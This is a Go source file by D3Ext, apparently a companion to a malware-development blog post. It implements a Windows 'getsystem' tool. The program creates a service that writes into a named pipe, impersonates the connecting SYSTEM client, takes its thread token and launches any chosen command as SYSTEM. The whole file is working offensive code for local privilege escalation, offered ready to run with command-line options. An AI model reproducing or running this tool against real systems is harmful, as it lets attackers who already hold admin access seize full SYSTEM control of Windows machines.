package main

/*

Author: D3Ext
Blog post: https://d3ext.github.io/malware-dev-11/

*/

import (
  "os"
  "fmt"
  "log"
  "time"
  "flag"
  "os/exec"
  "unsafe"
  "syscall"

  "golang.org/x/sys/windows"
  ml "github.com/D3Ext/maldev/logging"
  ms "github.com/D3Ext/maldev/system"
)

// a bunch of Windows constants used by API calls
const (
  PIPE_ACCESS_DUPLEX       = 0x00000003
  PIPE_TYPE_MESSAGE        = 0x00000004
  PIPE_WAIT                = 0x00000000
  CREATE_NEW_CONSOLE       = 0x00000010
  CREATE_NEW_PROCESS_GROUP = 0x00000200
  PIPE_READMODE_MESSAGE    = 0x00000002
)

// used with defer to remove it before exiting
func deleteService(svc_name string) {
  c := exec.Command("cmd.exe")
  c.SysProcAttr = &syscall.SysProcAttr{}
  c.SysProcAttr.CmdLine = "/R sc.exe delete " + svc_name
  _, err := c.Output()
  if err != nil {
    log.Fatalf("error deleting service: %s\n", err)
  }
}

// used with defer to delete previously created named pipe before exiting
func deleteNamedPipe(pipe_handle uintptr, DisconnectNamedPipe *windows.LazyProc) {
  _, _, err := DisconnectNamedPipe.Call(uintptr(pipe_handle))
  if err != syscall.Errno(0) {
    fmt.Printf("error disconnecting named pipe: %s\n", err)
  }

  err = syscall.CloseHandle(syscall.Handle(pipe_handle))
  if err != nil {
    fmt.Printf("error closing close handle: %s\n", err)
  }

  return
}

func helpPanel(){
  fmt.Println(`
Usage of getsystem:
    -c)     command/binary to launch as SYSTEM (default: "cmd.exe")
    -n)     name of the named pipe to create (default: "examplepipe")
    -s)     name of the service to create (default: "examplesvc")
    -v)     print more information during the whole process
    -h)     display this help panel
  `)
}

func main(){
  var command string
  var pipe_name string
  var service_name string
  var verbose bool
  var help bool

  // Parse CLI flags
  flag.StringVar(&command, "c", "cmd.exe", "")
  flag.StringVar(&pipe_name, "n", "examplepipe", "")
  flag.StringVar(&service_name, "s", "examplesvc", "")
  flag.BoolVar(&verbose, "v", false, "")
  flag.BoolVar(&help, "h", false, "")
  flag.Parse()

  // Print ASCII banner
  ml.PrintBanner("Get-System")

  // Check help panel argument
  if (help) {
    helpPanel()
    os.Exit(0)
  }

  // Check if user has high privileges
  privs_check, err := ms.GetUserPrivs()
  if err != nil {
    log.Fatal(err)
  }

  if (privs_check == false) {
    log.Fatal("non-high privileges detected, you need more privs\n")
  }

  // Show basic info
  fmt.Println("[*] Pipe name:", pipe_name)
  fmt.Println("[*] Service name:", service_name)
  fmt.Println("[*] Trying to execute \"" + command + "\" as SYSTEM")
  time.Sleep(200 * time.Millisecond)

  if (verbose) {
    fmt.Println("Resolving Windows API calls")
  }

  // Parse Windows DLLs and API calls
  kernel32 := windows.NewLazyDLL("kernel32.dll")
  advapi32 := windows.NewLazyDLL("advapi32.dll")

  CreateNamedPipeA := kernel32.NewProc("CreateNamedPipeA")
  ConnectNamedPipe := kernel32.NewProc("ConnectNamedPipe")
  GetCurrentThread := kernel32.NewProc("GetCurrentThread")
  DisconnectNamedPipe := kernel32.NewProc("DisconnectNamedPipe")
  ImpersonateNamedPipeClient := advapi32.NewProc("ImpersonateNamedPipeClient")
  OpenThreadToken := advapi32.NewProc("OpenThreadToken")
  CreateProcessWithTokenW := advapi32.NewProc("CreateProcessWithTokenW")


  if (verbose) {
    fmt.Println("Creating service...")
  }

  // Define named pipe and service values
  named_pipe := "\\\\.\\pipe\\" + pipe_name
  service := "/R sc.exe create " + service_name + " binPath= \"cmd.exe /R type C:\\Windows\\win.ini > " + named_pipe + "\""
  
  // Create service (run command)
  c := exec.Command("cmd.exe")
  c.SysProcAttr = &syscall.SysProcAttr{}
  c.SysProcAttr.CmdLine = service

  err = c.Run()
  if err != nil { // Handle error
    log.Fatalf("error creating service: %s\n", err)
  }
  defer deleteService(service_name)
  

  if (verbose) {
    fmt.Println("Calling CreateNamedPipeA...")
  }

  // Convert pipe name to ptr
  chars := append([]byte(named_pipe), 0)
  name := &chars[0]

  // Call CreateNamedPipeA
  r1, _, err := CreateNamedPipeA.Call(
    uintptr(unsafe.Pointer(name)),
    uintptr(uint32(PIPE_ACCESS_DUPLEX)),
    uintptr(uint32(PIPE_TYPE_MESSAGE|PIPE_WAIT)),
    uintptr(uint32(2)),
    uintptr(uint32(0)),
    uintptr(uint32(0)),
    uintptr(uint32(0)),
    uintptr(unsafe.Pointer(nil)),
  )

  pipe_handle := r1 // return code

  if err != syscall.Errno(0) { // Handle error
    log.Fatalf("error has ocurred while creating named pipe: %s\n", err)
  }
  defer deleteNamedPipe(pipe_handle, DisconnectNamedPipe) // pass handle and DisconnectNamePipe proc


  if (verbose) {
    fmt.Println("Starting service...")
  }

  // Start service which allows us to steal SYSTEM token
  go func() {
    c2 := exec.Command("cmd.exe")
    c2.SysProcAttr = &syscall.SysProcAttr{}
    c2.SysProcAttr.CmdLine = "/R sc.exe start " + service_name
    _, err = c2.Output()
    if err != nil { // Handle error
      if err != syscall.Errno(0) { // Handle error
        log.Fatalf("error starting service: %s\n", err)
      }
	  }
  }()


  if (verbose) {
    fmt.Println("Calling ConnectNamedPipe...")
  }

  // Connect to named pipe
  _, _, err = ConnectNamedPipe.Call(
    uintptr(pipe_handle),
    uintptr(unsafe.Pointer(nil)),
  )

  if err != syscall.Errno(0) { // Handle error
    log.Fatalf("error connecting to named pipe: %s\n", err)
  }

  // Read from pipe
  var done uint32
  err = syscall.ReadFile(syscall.Handle(pipe_handle), []byte{255}, &done, nil)
  if err != nil { // Handle error
    log.Fatalf("error reading from pipe: %s\n", err)
  }


  if (verbose) {
    fmt.Println("Calling ImpersonateNamedPipeClient...")
  }

  // Impersonate client
  _, _, err = ImpersonateNamedPipeClient.Call(
    uintptr(pipe_handle),
  )

  if err != syscall.Errno(0) { // Handle error
    log.Fatalf("error connecting to pipe: %s\n", err)
  }


  if (verbose) {
    fmt.Println("Calling GetCurrentThread...")
  }

  // Get current thread. Call GetCurrentThread
  thread_handle, _, err := GetCurrentThread.Call()
  if err != syscall.Errno(0) { // Handle error
    log.Fatalf("GetCurrentThread failed: %s\n", err)
  }


  if (verbose) {
    fmt.Println("Calling OpenThreadToken...")
  }

  // Get token from current thread. Call OpenThreadToken
  var token_handle uintptr
  _, _, err = OpenThreadToken.Call(
    uintptr(syscall.Handle(thread_handle)),
    uintptr(uint32(windows.TOKEN_ALL_ACCESS)),
    uintptr(uint32(0)),
    uintptr(unsafe.Pointer(&token_handle)),
  )

  if err != syscall.Errno(0) { // Handle error
    log.Fatalf("OpenThreadToken failed: %s\n", err)
  }


  if (verbose) {
    fmt.Println("Calling CreateProcessWithTokenW...")
  }
  
  // Define process arguments to be created with token
  cmd, _ := syscall.UTF16PtrFromString(command)
  si := new(syscall.StartupInfo)
  si.Cb = uint32(unsafe.Sizeof(*si))
  pi := new(syscall.ProcessInformation)

  // Call CreateProcessWithTokenW
  _, _, err = CreateProcessWithTokenW.Call(
    uintptr(uintptr(token_handle)),
    uintptr(uint32(0)),
    uintptr(unsafe.Pointer(nil)),
    uintptr(unsafe.Pointer(cmd)),
    uintptr(uint32(CREATE_NEW_CONSOLE|CREATE_NEW_PROCESS_GROUP)),
    uintptr(unsafe.Pointer(nil)),
    uintptr(unsafe.Pointer(nil)),
    uintptr(unsafe.Pointer(si)),
    uintptr(unsafe.Pointer(pi)),
  )
	
  if err != syscall.Errno(0) { // Handle error
    log.Fatalf("CreateProcessWithTokenW failed: %s\n", err)
  }
  
  fmt.Println("\n[+] Process finished!\n")
}


